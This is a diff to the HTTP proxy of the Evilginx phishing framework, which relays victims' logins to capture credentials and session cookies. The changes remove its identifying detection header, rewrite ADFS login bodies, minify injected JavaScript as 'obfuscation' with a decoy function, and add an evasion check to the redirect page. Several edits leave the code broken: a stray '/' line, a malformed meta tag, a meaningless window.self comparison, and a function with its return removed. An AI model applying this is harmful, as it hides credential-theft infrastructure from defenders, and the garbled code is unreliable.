@@ -49,9 +49,9 @@ const (
 	CONVERT_TO_PHISHING_URLS = 1
 )
 
-const (
-	HOME_DIR = ".evilginx"
-)
+//const (
+	//HOME_DIR = ".evilginx"
+//)
 
 const (
 	httpReadTimeout  = 45 * time.Second
@@ -203,7 +203,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
+			//o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -466,7 +466,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				//req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,10 +656,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						//req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						newBody := strings.Replace(string(body), "%2Fadfs.example.com%3A443%2F", "%2Fadfs.example.com%2F", -1)
+						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(newBody)))
+						req.ContentLength = int64(len(newBody))
 
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
@@ -790,130 +793,80 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
-
+								/
 								for k, v := range req.PostForm {
 									for i, vv := range v {
 										// patch phishing URLs in POST params with original domains
 										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
 									}
 								}
-
-								for k, v := range req.PostForm {
-									if len(v) > 0 {
-										log.Debug("POST %s = %s", k, v[0])
+							}
+						}
+				
+						// check if request should be intercepted
+						if pl != nil {
+							if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+								for _, ic := range pl.intercept {
+									//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+									//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+									if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+										return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
 									}
 								}
+							}
+						}
 
-								body = []byte(req.PostForm.Encode())
-								req.ContentLength = int64(len(body))
-
-								// force posts
-								for _, fp := range pl.forcePost {
-									if fp.path.MatchString(req.URL.Path) {
-										log.Debug("force_post: url matched: %s", req.URL.Path)
-										ok_search := false
-										if len(fp.search) > 0 {
-											k_matched := len(fp.search)
-											for _, fp_s := range fp.search {
-												for k, v := range req.PostForm {
-													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
-														if k_matched > 0 {
-															k_matched -= 1
-														}
-														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
-														break
-													}
-												}
-											}
-											if k_matched == 0 {
-												ok_search = true
-											}
-										} else {
-											ok_search = true
-										}
-
-										if ok_search {
-											for _, fp_f := range fp.force {
-												req.PostForm.Set(fp_f.key, fp_f.value)
-											}
-											body = []byte(req.PostForm.Encode())
-											req.ContentLength = int64(len(body))
-											log.Debug("force_post: body: %s len:%d", body, len(body))
-										}
+						if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+							s, ok := p.sessions[ps.SessionId]
+							if ok && !s.IsDone {
+								for _, au := range pl.authUrls {
+									if au.MatchString(req.URL.Path) {
+										s.Finish(true)
+										break
 									}
 								}
-
-							}
-
-						}
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-					}
-				}
-
-				// check if request should be intercepted
-				if pl != nil {
-					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-						for _, ic := range pl.intercept {
-							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
-							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
-							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
 							}
 						}
 					}
-				}
 
-				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-					s, ok := p.sessions[ps.SessionId]
-					if ok && !s.IsDone {
-						for _, au := range pl.authUrls {
-							if au.MatchString(req.URL.Path) {
-								s.Finish(true)
-								break
+					return req, nil
+				})
+
+				p.Proxy.OnResponse().
+				DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+					if resp == nil {
+						return nil
+					}
+
+					// handle session
+					ck := &http.Cookie{}
+					ps := ctx.UserData.(*ProxySession)
+					if ps.SessionId != "" {
+						if ps.Created {
+							ck = &http.Cookie{
+								Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
+								Value:   ps.SessionId,
+								Path:    "/",
+								Domain:  p.cfg.GetBaseDomain(),
+								Expires: time.Now().Add(60 * time.Minute),
 							}
 						}
 					}
-				}
-			}
 
-			return req, nil
-		})
-
-	p.Proxy.OnResponse().
-		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
-			if resp == nil {
-				return nil
-			}
-
-			// handle session
-			ck := &http.Cookie{}
-			ps := ctx.UserData.(*ProxySession)
-			if ps.SessionId != "" {
-				if ps.Created {
-					ck = &http.Cookie{
-						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
-						Value:   ps.SessionId,
-						Path:    "/",
-						Domain:  p.cfg.GetBaseDomain(),
-						Expires: time.Now().Add(60 * time.Minute),
+					allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
+					if allow_origin != "" && allow_origin != "*" {
+						if u, err := url.Parse(allow_origin); err == nil {
+							if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
+								resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+							}
+						} else {
+							log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
+						}
+						resp.Header.Set("Access-Control-Allow-Credentials", "true")
 					}
-				}
-			}
-
-			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
-			if allow_origin != "" && allow_origin != "*" {
-				if u, err := url.Parse(allow_origin); err == nil {
-					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
-						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
-					}
-				} else {
-					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
-				}
-				resp.Header.Set("Access-Control-Allow-Credentials", "true")
-			}
-			var rm_headers = []string{
-				"Content-Security-Policy",
-				"Content-Security-Policy-Report-Only",
+					var rm_headers = []string{
+						"Content-Security-Policy",
+						"Content-Security-Policy-Report-Only",
 				"Strict-Transport-Security",
 				"X-XSS-Protection",
 				"X-Content-Type-Options",
@@ -1313,7 +1266,7 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
+	body := fmt.Sprintf("<html><head><meta content='no-referrer name='referrer'><script>if(window.self!='google.com'){top.location.href='%s';}</script></head><body></body></html>", rurl)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
@@ -1330,16 +1283,23 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	}
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
+	
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		minifier := minify.New() // "github.com/tdewolff/minify/js"
+		minifier.AddFunc("text/javascript", js.Minify)
+		obfuscatedScript, err := minifier.String("text/javascript", script)
+		if err != nil {
+			// Handle error - Obfuscation failed
+			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+		}
+		d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
+		//d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
 		return body
-	}
-	ret := []byte(re.ReplaceAllString(string(body), d_inject))
-	return ret
-}
+} 
 
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	vals := u.Query()
@@ -1788,9 +1748,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+//func (p *HttpProxy) getHomeDir() string {
+	//return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+//}
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
